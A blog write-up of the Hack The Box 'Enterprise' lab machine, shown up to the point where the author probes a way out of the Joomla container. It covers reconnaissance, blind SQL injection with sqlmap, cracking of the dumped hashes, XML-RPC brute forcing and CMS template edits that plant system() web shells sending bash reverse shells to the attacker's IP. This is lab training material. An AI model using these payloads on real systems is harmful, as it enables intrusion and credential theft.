---
layout: post
title:  "Enterprise Writeup - Hack The Box"
date:   2024-05-23
desc: ""
keywords: "HTB,eWPT,eCPPTv2,eCPTXv2,Linux,WordPress,SQLi,Cracking,Joomla,DockerBreakout,BufferOverflow,Medium"
categories: [HTB]
tags: [HTB,eWPT,eCPPTv2,eCPTXv2,Linux,WordPress,SQLi,Cracking,Joomla,DockerBreakout,BufferOverflow,Ret2libc,PIEBypass,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** **Enterprise** box made me face again old vulnerabilities but new challenges, so I had to research and read a lot of resources on the internet. The machine is classified as **medium** for the various exploits to be performed and finally, the **Buffer Overflow** of a 32bit binary that made me try again and again until I pwned the box. I learned and reinforced a lot of knowledge that I am strengthening every time I face the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs.

<br /><br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_000.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After I deploy the machine on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, I can already check my connectivity with it using `ping` and start the **Reconnaissance phase** to evaluate possible attack vectors, I find with `nmap` some **HTTP** services and another somewhat strange one on port **32812* that I will look at more in depth later. With the information I have I can search the Internet for the **codename**, the strange thing is that I <ins>find different ones</ins>, a ***clear sign** that **containers** are being implemented. Also with `whatweb` I look for more information on the technologies that are implemented in **HTTP** services, nothing interesting so far.

```bash
ping -c 1 10.10.10.61
whichSystem.py 10.10.10.61
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.61 -oG allPorts
nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN targeted
# :(
nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN targeted -Pn
# :(
sudo nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN targeted
# as root user  :)

cat targeted
#    --> OpenSSH 7.4p1 Ubuntu 10
#    google.es --> OpenSSH 7.4p1 Ubuntu 10 launchpad  -->   Sid
#    --> Apache httpd 2.4.10
#    google.es --> Apache httpd 2.4.10 launchpad      -->   Jessie
#    --> Apache httpd 2.4.25
#    google.es --> Apache httpd 2.4.25 launchpad      -->   Stretch
#    --> port 32812           unknown    ?

# HTTP services
cat targeted | grep http
whatweb http://10.10.10.61 https://10.10.10.61 http://10.10.10.61:8080
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_001.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_002.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_003.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_004.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_005.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access from my web browser to the different **HTTP** services that are in production on the **Enterprise** machine, I find two **CMS**, **WordPress** and **Joomla**, in addition to the typical welcome page of the **Apache** server. The **WordPress** is not displayed correctly, as it is using virtual hosting, I correct it by modifying my `hosts` configuration file and after reloading the page, with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I finish to corroborate that it is a **CMS Wordpress**. I also test with `nc` and `telnet` to leak information from port **32812** and there is a **LCARS** system offering itself.

> [A content management system (**CMS**)](https://en.wikipedia.org/wiki/Content_management_system){:target="_blank"} is computer software used to manage the creation and modification of digital content (content management). A **CMS** is typically used for enterprise content management (**ECM**) and web content management (**WCM**).

> **[WordPress](https://www.hostinger.com/tutorials/what-is-wordpress){:target="_blank"}** is the leading website creation tool worldwide, powering over half of the web’s content. This open-source content management system (**CMS**) is versatile and easy to use, making it an ideal choice for users of all skill levels.

> **[Joomla](https://supporthost.com/what-is-joomla/){:target="_blank"}** is an open source and free **CMS** (**Content Management System**). With this platform you can create dynamic websites and manage them through an administration panel with sophisticated features, is written in **PHP** and relies on a database which is usually **MySQL**, even though other databases could also be used.

> The **[Library Computer Access and Retrieval System (LCARS for short)](https://memory-alpha.fandom.com/wiki/Library_Computer_Access_and_Retrieval_System){:target="_blank"}** was the main computer system employed by the United Federation of Planets by the mid-24th century. It was used aboard all Starfleet vessels, starbases, and space stations. (Star Trek: The Next Generation; Star Trek: Deep Space Nine; Star Trek: Voyager; Star Trek: Picard).

```bash
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 enterprise.htb              # :)

# http://enterprise.htb/
#    --> Wordpress 4.8.1

nc -nv 10.10.10.61 32812
telnet 10.10.10.61 32812
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_006.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_007.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_008.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I begin by investigating the **WordPress CMS**, if I access the typical login path (<ins>it is a very bad practice not to change it</ins>) I see that I can perform an enumeration of users through a brute force attack, because thanks to the error message response when trying to enter is the one that comes by default (<ins>another bad practice</ins>). If I look at the published posts and I see the author (**william.riker**), I check that it is a valid user, and the field of action becomes more limited.

```html
# http://enterprise.htb/          --> Post --> William.Riker
# /wp-admin       --> 302     --> /wp-login.php       william.riker    :)
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_009.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_010.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something, that I often forget to do (**<ins>my bad</ins>**), is to use `nmap` and use a script to find files and paths in the different web services, before using more powerful tools like `dirbuster`, `gobuster`, `wfuzz`, etc. This way I often avoid wasting a lot of time, on this machine I find different resources and a **.zip** file that I download and analyze. When I unzip them they are **.php** files and correspond to a plugin that <ins>may or may not be installed</ins> on the **WordPress**. If I look for it in the path that by default the plugin files are stored, I get lucky and find it, **as well as the files**. In one of the files I see that it needs a value for the `query` parameter, so it performs a query in the database, but when I do some tests I can not leak any information.

```bash
nmap --script http-enum -p80,443,8080 10.10.10.61 -oN webScan
#    --> https://enterprise.htb/files/

mv /home/al3j0/Downloads/lcars.zip .
file lcars.zip
7z l lcars.zip
unzip lcars.zip
catnp *
#    --> lcars_db.php          --> WordPress lcars Plugins???

# http://enterprise.htb/wp-content/plugins/lcars/
#    --> Forbidden       <-- Exists!!
#    --> lcars_db.php          --> $query = $_GET['query']; 
# http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=TEST
# view-source:http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=YAYAYAYAY.
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_011.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_012.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_013.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_014.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_015.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_016.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

**OMG**, it is in these moments that I want to have some lateral thinking (I never had them or never noticed), but I had forgotten about the other **.php** files, and in one of them I find that it allows to send a value by using the `query` parameter, but in this case an **integer** value. Now if I can leak some things that promise but not much more.

```bash
#    --> lcars_dbpost.php      --> $query = (int)$_GET['query'];       <-- BY NUMBER

# http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1         :)

curl -s -X GET 'http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=1' | head -n 2
for i in $(seq 1 100); do bash -c "curl -s -X GET 'http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i' | head -n 1"; done
for i in $(seq 1 100); do bash -c "echo -n '$i --> ' && curl -s -X GET 'http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i' | head -n 1"; done
#    :( not much here!
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_017.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_018.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_019.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_020.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something I also always try to do is **SQL injections** - in practically everything I'm allowed to do - so that I don't forget the typical queries and maybe catch something. In this case I don't have much luck, but if I observe a strange behavior in the response time to different injections, maybe I'm in front of a **[Blind SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval){:target="_blank"}** and with `slqmap` I confirm that the query field is injectable because I can get the databases of the system.

```bash
# http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test'                           !!
# http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test' or sleep(5)-- -           ??
# http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test and sleep(5)-- -           :):)

# view-source:http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 order by 10-- -     ??

# view-source:http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 order by 1-- -      ??

sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test' --dbs --batch        # :(    ??
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch           # :)    ??
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_021.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_022.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_023.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_024.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I would *love* to create a custom script to do the **SQLi**, but according to some comments from much more experienced people, on this machine they don't work very well, so I'm going to keep using the powerful `sqlmap` tool, and very quickly get a password, which has all the appearance of being hashed using the **Wordpress algorithm**, but can't [crack it with `hashcat`](https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/){:target="_blank"}. To look for another attack vector, it's a pity because it looked very promising with **SQLi**.

```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress --tables
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_users --columns
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_users -C user_email,user_login,user_pass --dump

nvim hash
hashcat --example-hashes | grep '\$P\$' -A 3 -B 13
hashcat -a 0 -m 400 hash /usr/share/wordlists/rockyou.txt                 # :(
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_025.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_026.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_027.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_028.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_029.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_030.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_031.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now if I'm stuck, but thinking back a bit, I kept in my mind spinning the information I got from listing the posts based on their IDs, and some were related to passwords. Now with `sqlmap` I leak information from the posts, and the good thing is that this tool generates **.csv** files that I can then examine. I find some strings encoded in **Base64** but without any value and then finally I found some credentials.

```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress --tables
#    --> Table wp_posts

sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_posts --columns
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_posts -C ID,post_content --dump
#    --> /home/al3j0/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv

cat /home/al3j0/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv
cat /home/al3j0/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv | sed 's/\\n/\n/g'
cat /home/al3j0/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv | sed 's/\\n/\n/g' | grep -v '<blank>' | sed 's/\\r/\r/g'

echo YTo0OntzOjU6InRpdGxlIjtzOjc6IkZpbmQgVXMiO3M6NDoidGV4dCI7czoxNjQ6IjxzdHJvbmc+QWRkcmVzczwvc3Ryb25nPgoxMjMgTWFpbiBTdHJlZXQKTG9uZG9uIEVDMSA0VUsKCjxzdHJvbmc+SG91cnM8L3N0cm9uZz4KTW9uZGF5Jm1kYXNoO0ZyaWRheTogOTowMEFNJm5kYXNoOzU6MDBQTQpTYXR1cmRheSAmYW1wOyBTdW5kYXk6IDExOjAwQU0mbmRhc2g7MzowMFBNIjtzOjY6ImZpbHRlciI7YjoxO3M6NjoidmlzdWFsIjtiOjE7fQ== | base64 -d; echo

echo YTo0OntzOjU6InRpdGxlIjtzOjE1OiJBYm91dCBUaGlzIFNpdGUiO3M6NDoidGV4dCI7czo4NToiVGhpcyBtYXkgYmUgYSBnb29kIHBsYWNlIHRvIGludHJvZHVjZSB5b3Vyc2VsZiBhbmQgeW91ciBzaXRlIG9yIGluY2x1ZGUgc29tZSBjcmVkaXRzLiI7czo2OiJmaWx0ZXIiO2I6MTtzOjY6InZpc3VhbCI7YjoxO30= | base64 -d; echo

echo YToxOntzOjU6InRpdGxlIjtzOjY6IlNlYXJjaCI7fQ== | base64 -d; echo
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_032.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_033.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_034.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_035.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_036.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_037.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_038.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_039.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now it is very simple, to test the credentials I obtained, because I have only one candidate for username (**william.rikker**), but in the case of <ins>having many or even none</ins>, I can perform a brute force attack. There are some mechanisms, such as using the information available in the **xmlrpc.php** file (if visible) and using **BurpSuite**, or even using the excellent `wpscan` tool. Following both ways I find the user and his password, all the information of the steps to follow is available in the excellent **[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress){:target="_blank"}** resource and **[WordPress XMLRPC brute force attacks via BurpSuite](https://testpurposes.net/2016/11/01/wordpress-xmlrpc-brute-force-attacks-via-burpsuite/){:target="_blank"}**.

```bash
# http://enterprise.htb/xmlrpc.php            Exist!   :)

burpsuite &>/dev/null & disown
```

> **xml inyection**: get available methods

```xml
  <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
  </methodCall>

#        --> wp.getUsersBlogs   :)
```

> **xml inyection**: brute force attack with BurpSuite

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
     <methodName>wp.getUsersBlogs</methodName>
        <params>
           <param><value>administrator</value></param>
           <param><value>admin</value></param>
       </params>
</methodCall>

#        --> Incorrect username or password

# Burp --> Intruder --> sniper --> william.rikker  §pass§
#      --> Payloads (Credentials.txt) (Url-encode.... Disable!)
#      --> Options (Grep-extract -> Incorrect username or password)
```

```bash
wpscan --url http://enterprise.htb/ -U william.riker -P Crendentials.txt        # :)
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_040.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_041.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_042.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_043.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_044.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_045.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_046.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_047.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_048.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_049.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_050.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_051.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now if I try and successfully access the **WordPress** dashboard. I follow the steps that I already have somewhat recorded in the subconscious to obtain an **RCE**, I just have to modify the **404.php** file, but I can not get any response to verify connectivity to my attacker machine, I try the most common ways to **[generate an error](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress){:target="_blank"}** when accessing a non-existent resource but it does not work, but if accessing the **404.php** file directly. Now I can send a **Reverse Shell** to my machine and access the victim host, then I do a console treatment for better mobility.

> **Attacker Machine:**

```bash
tcpdump -i tun0 icmp -n

# WordPress --> Appearance --> Edithor --> 404.php
#    --> system('ping -c 1 10.10.14.16');
# http://enterprise.htb/404.php     :(
# http://enterprise.htb/oldboy      :(                  Does not work for any Theme!
# http://enterprise.htb/wp-content/themes/twentyseventeen/404.php       :)
# http://enterprise.htb/?p=404.php                                      :)

nc -nlvp 443

#    --> system("bash -c 'bash -i >&/dev/tcp/10.10.14.16./443 0>&1'");
# http://enterprise.htb/?p=404.php            :)
```

> **Victime Machine:**

```bash
whoami
hostname
hostname -I
#    --> 172.17.0.4 --> Container!

script /dev/null -c bash
# [Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_052.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_053.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_054.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_055.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_056.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_057.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_058.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I'm on the victim machine, which turns out to be a container from what it tells me when I run the `hostname -I` command, I perform some reconnaissance tasks but I can't find much information to escape from the container. Since I don't have text editing binaries like `nano` or `vi` either, I'm going to create a small script on my machine, to search for other hosts, and transfer it to the victim machine. After running it I find other containers but I still can't find the way to escape, <ins>I'm stuck again</ins>.

> **Victime Machine:**

```bash
id
groups
find \-perm -4000 2>/dev/null
ifconfig

# More hosts??
cd /tmp
which nano            # :(
which vi              # :(
```

> **Atacker Machine:**

```bash
nvim host_discovery.sh
cat host_discovery.sh
cat host_discovery.sh | base64 -w 0 | xclip -sel clip
```

> **host_discovery.sh** script:

```bash
#!/bin/bash

for host in $(seq 1 255); do
  timeout 1 bash -c "ping -c 1 172.17.0.$host" &>/dev/null && echo "[+] Host 172.17.0.$host - ACTIVE" &
done; wait
```

> **Victime Machine:**

```bash
echo IyEvYmluL2Jhc2gKCmZvciBob3N0IGluICQoc2VxIDEgMjU1KTsgZG8KICB0aW1lb3V0IDEgYmFzaCAtYyAicGluZyAtYyAxIDE3Mi4xNy4wLiRob3N0IiAmPi9kZXYvbnVsbCAmJiBlY2hvICJbK10gSG9zdCAxNzIuMTcuMC4kaG9zdCAtIEFDVElWRSIgJgpkb25lOyB3YWl0Cg== | base64 -d > host_discovery.sh && chmod +x host_discovery.sh

./host_discovery.sh
#    [+] Host 172.17.0.1 - ACTIVE      <-- Victime host?
#    [+] Host 172.17.0.4 - ACTIVE      <-- WordPress Container
#    [+] Host 172.17.0.3 - ACTIVE      ?
#    [+] Host 172.17.0.2 - ACTIVE      ?
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_059.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_060.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<br /><br />

I go back through what I have so far, and I also count on the other **CMS** (**Joomla**) - I often get a bit disoriented, because I think that with several **HTTP** services running, it's just **honeypots**. Now with the **SQLi** I had previously exploited with `sqlmap`, I also had access to the **Joomla** data. I perform the necessary commands and get some hashed passwords, with `hashcat` I identify the type of algorithm being implemented (**Blowfish**) and successfully crack them (using first the credentials I already had, so as not to waste a lot of time using **rockyou.txt**).

```bash
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch
#    --> joomla, joomladb

sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomla --tables
#    --> No tables found

sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb --tables
#    --> joomladb --> edz2g_users

sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb -T edz2g_users --columns
#    --> name,email,password,username

sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb -T edz2g_users -C name,email,password,username --dump

nvim hash
hashcat --example-hashes | grep '$2a\$' -C 13 -A 3

# Before wasting a lot of time, I can test the credentials I already have (Password Reuse)
hashcat -a 0 -m 3200 hashes ./Crendentials.txt --username     # :)
# or:
john --wordlist=Credentials.txt hashes                        # :)
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_061.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_062.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_063.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_064.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_065.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_066.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_067.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_068.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_069.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the credentials to access the **Joomla CMS**, I can again try to **[send a Reverse Shell](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla){:target="_blank"}** to my attacking machine. The steps are somewhat similar when I did the same in the **WordPress**, I have to retouch the **error.php** file of the template and inject the command I want to run on the server, as the user **www-data** most likely. I try to pass directly the command through a parameter that I define using the **GET** method but I do not succeed, it is very likely due to the special characters, so directly in the **error.php** file I insert the command to then generate an error and get the **Reverse Shell**, I have succeeded in accessing the machine again.

```bash
# http://enterprise.htb:8080/administrator/
#      --> geordi.la.forge:....          Try combinations :)
#      --> Extensions --> Templates --> Templates --> Protostar Details and Files --> error.php
#                  system($_GET['cmd']);

# http://enterprise.htb:8080/templates/protostar/error.php?cmd=id         :)

nc -nlvp 443

# http://enterprise.htb:8080/templates/protostar/error.php?cmd=bash -c 'bash -i >&/dev/tcp/10.10.14.16/443 0>&1'    :(

#      --> system("bash -c 'bash -i >&/dev/tcp/10.10.14.16/443 0>&1'");

nc -nlvp 443

# http://enterprise.htb:8080/<>           :)
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_070.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_071.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_072.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_073.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_074.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I am again in a container - I perform a console treatment first-, another one, which now serves to host the **Joomla CMS**, and again the user flag is not the one I need to demonstrate on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform that I got access to the box (it had already happened to me in the **WordPress** container, it was a decoy file). I list for quite some time and do not find a way to escape, until in the home directory of the user **www-data** I notice a very suspicious **`files`** folder and its contents even more, since it is the same **.zip** file that I had found with `nmap`, and its contents, the same **.php** files. If I unzip it and access with the web browser to the **HTTPS** service on port **443** I observe now the folder just unzipped, something makes me think that **mounts** are being used in the containers and with `mount` I check it, I perform some quick tests to create **.txt** and **.php** files (I'm already imagining how to escape from the container). I also look at the other mounted files, but nothing important.

```bash
script /dev/null -c bash
[Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

whoami
hostname  
hostname -I
#     --> 172.17.0.3

cd /var/www/html
ls -l
#     --> files     ??

cd /var/www/html/files
ls -la
#     --> lcars.zip
7z l lcars.zip        # :(
unzip lcars.zip       # :)

echo 'hello' > test.txt
echo 'hi oldboy' > test.php

# Mounts should be implemented
mount --help
#    -a, --all               mount all filesystems mentioned in fstab
#    -l, --show-labels       show also filesystem labels

mount -a              # :(
mount -l
#     --> /dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_075.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_076.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
